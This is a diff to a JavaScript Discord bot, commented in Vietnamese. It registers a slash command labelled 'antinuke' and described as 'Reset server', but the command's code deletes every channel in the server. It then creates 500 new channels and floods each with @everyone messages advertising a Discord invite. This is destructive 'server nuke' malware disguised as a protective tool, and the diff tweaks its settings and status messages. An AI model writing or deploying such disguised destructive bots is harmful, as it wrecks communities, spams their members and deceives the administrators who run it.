@@ -22,18 +22,18 @@ const client = new Client({
 const sleep = ms => new Promise(r => setTimeout(r, ms));
 
 /* ===== CONFIG ===== */
-const CHANNEL_NAME = "Server nuked";
-const CREATE_COUNT = 536;
+const CHANNEL_NAME = "ez";
+const CREATE_COUNT = 500;
 const MSG_COUNT_MIN = 4;
 const MSG_COUNT_MAX = 5;
-const DELAY = 109;
+const DELAY = 120;
 /* ================== */
 
 /* ===== Slash Command ===== */
 const commands = [
   new SlashCommandBuilder()
     .setName("antinuke")
-    .setDescription("Bật anti nuke")
+    .setDescription("Reset server")
 ].map(cmd => cmd.toJSON());
 
 const rest = new REST({ version: "10" }).setToken(process.env.BOT_TOKEN);
@@ -62,13 +62,17 @@ client.on("interactionCreate", async interaction => {
 
   const guild = interaction.guild;
 
-  await interaction.reply({
-    content: "⚠️ Chuẩn Bị...",
-    ephemeral: true
+  // 🔥 Tạo 1 kênh sống sót trước
+  const safeChannel = await guild.channels.create({
+    name: "antinuke-running",
+    type: ChannelType.GuildText
   });
+
+  await safeChannel.send("⚠️ Đang reset server...");
 
   /* ===== XOÁ CHANNEL ===== */
   for (const ch of [...guild.channels.cache.values()]) {
+    if (ch.id === safeChannel.id) continue;
     try {
       await ch.delete();
       await sleep(DELAY);
@@ -87,10 +91,7 @@ client.on("interactionCreate", async interaction => {
     } catch {}
   }
 
-  await interaction.followUp({
-    content: "⚡ Sắp xong...😂",
-    ephemeral: true
-  });
+  await safeChannel.send("⚡ Đang tạo kênh mới...");
 
   /* ===== TẠO KÊNH + GỬI TIN ===== */
   for (let i = 0; i < CREATE_COUNT; i++) {
@@ -105,7 +106,7 @@ client.on("interactionCreate", async interaction => {
         MSG_COUNT_MIN;
 
       for (let j = 0; j < msgCount; j++) {
-        await ch.send("@everyone 🚀Join: https://discord.gg/P9yeTvwKjB");
+        await ch.send("@everyone 🚀 Join: https://discord.gg/P9yeTvwKjB");
         await sleep(100);
       }
 
@@ -113,10 +114,7 @@ client.on("interactionCreate", async interaction => {
     } catch {}
   }
 
-  await interaction.followUp({
-    content: "✅ Hoàn tất Antinuke.",
-    ephemeral: true
-  });
+  await safeChannel.send("✅ Hoàn tất Antinuke.");
 });
 
 client.login(process.env.BOT_TOKEN);
